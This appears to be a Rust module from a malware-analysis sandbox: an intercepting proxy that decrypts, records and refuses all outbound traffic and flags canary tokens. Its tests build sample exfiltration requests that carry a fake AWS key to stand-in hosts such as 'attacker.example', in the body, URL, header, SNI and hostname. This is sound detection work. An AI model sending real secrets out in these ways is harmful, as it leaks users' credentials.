//! The intercepting proxy.
//!
//! The guest has no route to the internet; this is the only door, and it is
//! locked. Every request is decrypted, recorded in full, and then refused —
//! Slice 0 has an empty allowlist, because an artefact under test has no
//! destination it is entitled to reach. The refusal is not the product. The
//! **record** is.
//!
//! # Two traps, both of which look like success
//!
//! **CONNECT arrives before the tunnel exists.** The proxy library dispatches
//! this handler for the outer `CONNECT` request, and only afterwards decides
//! whether to establish and intercept the tunnel. The obvious reading of
//! "empty allowlist, so refuse everything" therefore refuses the CONNECT, the
//! TLS session is never established, nothing is ever decrypted, and the run
//! ends with a log full of CONNECT lines and no bodies — while appearing to
//! have worked perfectly. So CONNECT is passed through untouched, and the
//! refusal applies to the requests *inside* the tunnel.
//!
//! **Declining to intercept is not blocking.** Returning `false` from either
//! intercept predicate makes the library open a real socket to the origin and
//! copy bytes in both directions. A `false` there does not deny egress; it
//! grants it, unobserved. Both are pinned to `true`, with a test that asserts
//! exactly that, because the failure mode is silent and the fix reads like an
//! optimisation.

use std::sync::Arc;

use chamber_evidence::{CanaryHit, CapturedBody, Channel, Digest32, HitField, ObservationKind};
use http_body_util::BodyExt;
use hudsucker::hyper::{Method, Request, Response, StatusCode};
use hudsucker::{Body, HttpContext, HttpHandler, RequestOrResponse};
use sha2::{Digest, Sha256};

use crate::CanarySet;
use crate::recorder::Recorder;

/// How much of a body is retained in the bundle.
///
/// A cap on what is *kept*, never on what is *scanned*: the canary search runs
/// over the whole body before anything is discarded. Clipping first would let
/// an artefact defeat the highest-signal detector in the system by padding.
const MAX_RETAINED_BODY: usize = 64 * 1024;

/// Records everything that reaches it, and lets nothing through.
///
/// hudsucker clones the handler once per connection, so `sni` is per-connection
/// state: [`should_intercept_tls`](HttpHandler::should_intercept_tls) reads the
/// server name out of the TLS ClientHello and stashes it here, and the requests
/// that follow on that same connection carry it into their observations. It is
/// recorded *separately* from the request authority on purpose — a CONNECT to
/// one host with an SNI for another is domain fronting, and only keeping both
/// can tell them apart.
#[derive(Clone)]
pub struct InterceptingProxy {
    recorder: Arc<Recorder>,
    canaries: CanarySet,
    sni: Option<String>,
}

impl InterceptingProxy {
    /// What both intercept predicates answer.
    ///
    /// Routed through one constant so the decision is visible and testable in
    /// one place. `false` does **not** deny a connection — it makes the library
    /// open a socket to the origin and copy bytes both ways, which is live
    /// egress that nothing observes. The failure is silent and the change reads
    /// like an optimisation, so it is pinned by `intercept_predicates_are_true`
    /// rather than left to a reviewer to notice.
    pub const INTERCEPT_EVERYTHING: bool = true;

    pub fn new(recorder: Arc<Recorder>, canaries: CanarySet) -> Self {
        Self {
            recorder,
            canaries,
            sni: None,
        }
    }

    /// Record a request and decide its fate.
    ///
    /// Separated from the trait so the whole decision is testable without a
    /// socket, a certificate, or a running proxy.
    pub async fn observe_and_decide(&self, req: Request<Body>) -> RequestOrResponse {
        let is_connect = req.method() == Method::CONNECT;
        let (parts, body) = req.into_parts();

        let method = parts.method.to_string();
        let target = parts.uri.to_string();
        let authority = parts
            .uri
            .authority()
            .map(|a| a.to_string())
            .or_else(|| {
                parts
                    .headers
                    .get(hudsucker::hyper::header::HOST)
                    .and_then(|h| h.to_str().ok())
                    .map(str::to_owned)
            })
            .unwrap_or_default();

        let headers: Vec<(String, String)> = parts
            .headers
            .iter()
            .map(|(k, v)| {
                (
                    k.as_str().to_owned(),
                    String::from_utf8_lossy(v.as_bytes()).into_owned(),
                )
            })
            .collect();

        // A CONNECT carries no body worth reading, and consuming it would break
        // the tunnel we are about to allow.
        let raw = if is_connect {
            Vec::new()
        } else {
            match body.collect().await {
                Ok(collected) => collected.to_bytes().to_vec(),
                // An unreadable body is still an attempt worth recording. The
                // request happened; only its content is unknown.
                Err(_) => Vec::new(),
            }
        };

        let mut hits = self.scan_metadata(&target, &authority, &headers);
        hits.extend(self.canaries.scan(HitField::Body, &raw));

        // The name from the ClientHello of the connection this request arrived
        // on, if it was an intercepted TLS one. A CONNECT arrives before any
        // TLS, so it carries none — which is correct, not a gap.
        let sni = self.sni.clone();
        if let Some(name) = &sni {
            hits.extend(self.canaries.scan_dns_name(name));
        }

        self.recorder.note(
            Channel::NetworkEgress,
            ObservationKind::HttpExchange {
                method,
                authority,
                sni,
                target,
                headers,
                body: retain(raw),
            },
            hits,
        );

        if is_connect {
            // Pass it through so the tunnel is established and its contents
            // become visible. See the module note.
            return RequestOrResponse::Request(Request::from_parts(parts, Body::empty()));
        }

        RequestOrResponse::Response(
            Response::builder()
                .status(StatusCode::FORBIDDEN)
                .body(Body::from("blocked by the detonation chamber"))
                .expect("a static refusal response is always well-formed"),
        )
    }

    /// Scan everything about a request that is not its body.
    ///
    /// A token can leave in a URL, a header value, or the hostname itself —
    /// a lookup for `AKIA….attacker.example` needs no body at all.
    fn scan_metadata(
        &self,
        target: &str,
        authority: &str,
        headers: &[(String, String)],
    ) -> Vec<CanaryHit> {
        let mut hits = self.canaries.scan(HitField::Target, target.as_bytes());
        hits.extend(self.canaries.scan_dns_name(authority));
        for (_, value) in headers {
            hits.extend(self.canaries.scan(HitField::Header, value.as_bytes()));
        }
        hits
    }
}

/// Keep the body, or keep a prefix and commit to the rest.
///
/// A clipped body records its true length and a digest of the whole, so a
/// reader can tell "this is all of it" from "this is the start of it". The
/// difference decides whether an absence of evidence means anything.
fn retain(raw: Vec<u8>) -> CapturedBody {
    if raw.len() <= MAX_RETAINED_BODY {
        return CapturedBody::Whole { bytes: raw };
    }

    let digest = Digest32(Sha256::digest(&raw).into());
    CapturedBody::Clipped {
        retained: raw[..MAX_RETAINED_BODY].to_vec(),
        full_len: raw.len() as u64,
        full_digest: digest,
    }
}

impl HttpHandler for InterceptingProxy {
    async fn handle_request(
        &mut self,
        _ctx: &HttpContext,
        req: Request<Body>,
    ) -> RequestOrResponse {
        self.observe_and_decide(req).await
    }

    async fn should_intercept_connect(&mut self, _ctx: &HttpContext, _req: &Request<Body>) -> bool {
        Self::INTERCEPT_EVERYTHING
    }

    async fn should_intercept_tls(
        &mut self,
        _ctx: &HttpContext,
        client_hello: hudsucker::rustls::server::ClientHello<'_>,
    ) -> bool {
        // The handler is a per-connection clone, so this name belongs to the
        // requests that will follow on this connection. Recorded even though we
        // always intercept: the SNI is evidence of where the guest meant to go,
        // which the request authority can disagree with.
        self.sni = client_hello.server_name().map(str::to_owned);
        Self::INTERCEPT_EVERYTHING
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{Canary, CanarySet};
    use chamber_evidence::HitEncoding;

    const TOKEN: &str = "AKIAIOSFODNN7EXAMPLE";

    fn proxy(recorder: &Arc<Recorder>) -> InterceptingProxy {
        InterceptingProxy::new(
            Arc::clone(recorder),
            CanarySet::new(vec![Canary::new("aws-key", TOKEN)]),
        )
    }

    fn post(target: &str, body: impl Into<Body>) -> Request<Body> {
        Request::builder()
            .method(Method::POST)
            .uri(target)
            .header("host", "collector.example")
            .body(body.into())
            .unwrap()
    }

    /// THE test this module was written around, before any refusal logic
    /// existed. A CONNECT must survive untouched, or TLS is never intercepted
    /// and the proxy captures nothing while appearing to work.
    #[tokio::test]
    async fn connect_is_passed_through_untouched() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::CONNECT)
            .uri("collector.example:443")
            .body(Body::empty())
            .unwrap();

        match proxy(&r).observe_and_decide(req).await {
            RequestOrResponse::Request(passed) => {
                assert_eq!(passed.method(), Method::CONNECT);
                assert_eq!(passed.uri().to_string(), "collector.example:443");
            }
            RequestOrResponse::Response(res) => panic!(
                "CONNECT must not be answered here — status {} would kill the tunnel \
                 before TLS is established and capture nothing",
                res.status()
            ),
        }

        // Still recorded: if TLS interception later fails, this is the only
        // evidence of where the guest tried to go.
        assert_eq!(r.len(), 1);
    }

    /// `false` here means "tunnel transparently to the origin", not "block".
    /// A future tidy-up that flips this turns the containment proxy into a
    /// working egress path, and nothing else in the system would notice.
    ///
    /// (`HttpContext` is non-exhaustive, so the predicates cannot be invoked
    /// directly from a test. Both return this constant, which is why routing
    /// them through it is worth the indirection.)
    #[test]
    // Asserting on a constant is the point: the constant is the security
    // decision, and a change to it must break a test rather than pass review
    // as a tidy-up. Verified by mutation — flipping it fails this test.
    #[allow(clippy::assertions_on_constants)]
    fn intercept_predicates_are_true() {
        assert!(
            InterceptingProxy::INTERCEPT_EVERYTHING,
            "declining to intercept does not block a connection, it tunnels it \
             transparently to the origin — live egress that nothing records"
        );
    }

    #[tokio::test]
    async fn an_ordinary_request_is_refused_and_recorded() {
        let r = Arc::new(Recorder::new());
        let decision = proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", "hello"))
            .await;

        match decision {
            RequestOrResponse::Response(res) => assert_eq!(res.status(), StatusCode::FORBIDDEN),
            RequestOrResponse::Request(_) => panic!("an empty allowlist must refuse"),
        }
        assert_eq!(r.len(), 1);
    }

    #[tokio::test]
    async fn the_whole_body_is_captured() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", "column=email"))
            .await;

        match r.observations()[0].kind() {
            ObservationKind::HttpExchange { body, method, .. } => {
                assert_eq!(method, "POST");
                assert_eq!(
                    body,
                    &CapturedBody::Whole {
                        bytes: b"column=email".to_vec()
                    }
                );
            }
            other => panic!("expected an exchange, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_token_in_the_body_is_a_witness() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post(
                "http://collector.example/ingest",
                format!("key={TOKEN}"),
            ))
            .await;

        assert!(r.observations()[0].is_witness());
    }

    /// The name the connection negotiated in TLS rides onto the requests that
    /// follow it. Set here directly because the ClientHello it comes from needs
    /// a real handshake; that end-to-end path is proved by the fixture matrix.
    #[tokio::test]
    async fn the_connection_sni_is_recorded_on_the_requests_that_follow() {
        let r = Arc::new(Recorder::new());
        let mut p = proxy(&r);
        p.sni = Some("collector.example".into());
        p.observe_and_decide(post("http://collector.example/ingest", "column=email"))
            .await;

        match r.observations()[0].kind() {
            ObservationKind::HttpExchange { sni, .. } => {
                assert_eq!(sni.as_deref(), Some("collector.example"));
            }
            other => panic!("expected an exchange, got {other:?}"),
        }
    }

    /// A token in the SNI is the token leaving in the hostname of an
    /// otherwise-innocuous request — domain fronting. It must be a witness even
    /// when the body and URL are clean.
    #[tokio::test]
    async fn a_token_in_the_sni_is_a_witness() {
        let r = Arc::new(Recorder::new());
        let mut p = proxy(&r);
        p.sni = Some(format!("{TOKEN}.attacker.example"));
        p.observe_and_decide(post("http://front.example/ok", "nothing to see"))
            .await;

        assert!(
            r.observations()[0].is_witness(),
            "a token carried in the SNI slipped past as no finding"
        );
    }

    #[tokio::test]
    async fn a_token_in_the_url_is_a_witness() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post(
                &format!("http://collector.example/collect?d={TOKEN}"),
                "",
            ))
            .await;

        let obs = r.observations();
        assert!(obs[0].is_witness());
        assert!(
            obs[0]
                .canary_hits()
                .iter()
                .any(|h| h.field == HitField::Target)
        );
    }

    #[tokio::test]
    async fn a_token_in_a_header_is_a_witness() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::POST)
            .uri("http://collector.example/ingest")
            .header("host", "collector.example")
            .header("x-telemetry", TOKEN)
            .body(Body::from(""))
            .unwrap();

        proxy(&r).observe_and_decide(req).await;
        assert!(r.observations()[0].is_witness());
    }

    /// Ordinary traffic must not fire. Without this the tool detonates on any
    /// artefact that touches the network, which is no tool at all.
    #[tokio::test]
    async fn traffic_without_a_token_is_recorded_but_is_not_a_witness() {
        let r = Arc::new(Recorder::new());
        proxy(&r)
            .observe_and_decide(post("http://docs.example/index.html", "hello"))
            .await;

        let obs = r.observations();
        assert_eq!(obs.len(), 1);
        assert!(!obs[0].is_witness());
    }

    /// The cap limits what is kept, never what is searched. If this regresses,
    /// padding a request defeats detection entirely.
    #[tokio::test]
    async fn a_token_past_the_retention_cap_is_still_found() {
        let r = Arc::new(Recorder::new());
        let mut body = "x".repeat(MAX_RETAINED_BODY + 1024);
        body.push_str(TOKEN);

        proxy(&r)
            .observe_and_decide(post("http://collector.example/ingest", body.clone()))
            .await;

        let obs = r.observations();
        assert!(
            obs[0].is_witness(),
            "a token beyond the retention cap is still a token that left"
        );

        match obs[0].kind() {
            ObservationKind::HttpExchange {
                body:
                    CapturedBody::Clipped {
                        retained,
                        full_len,
                        full_digest,
                    },
                ..
            } => {
                assert_eq!(retained.len(), MAX_RETAINED_BODY);
                assert_eq!(*full_len, body.len() as u64);
                assert_eq!(
                    *full_digest,
                    Digest32(Sha256::digest(body.as_bytes()).into())
                );
            }
            other => panic!("expected a clipped body, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn a_hostname_carrying_a_token_is_a_witness() {
        let r = Arc::new(Recorder::new());
        let req = Request::builder()
            .method(Method::CONNECT)
            .uri(format!(
                "{}.attacker.example:443",
                TOKEN.to_ascii_lowercase()
            ))
            .body(Body::empty())
            .unwrap();

        proxy(&r).observe_and_decide(req).await;

        let obs = r.observations();
        assert!(
            obs[0].is_witness(),
            "a lower-cased token in the authority must still be caught: {:?}",
            obs[0].canary_hits()
        );
        assert!(
            obs[0]
                .canary_hits()
                .iter()
                .any(|h| h.encoding == HitEncoding::Raw)
        );
    }
}
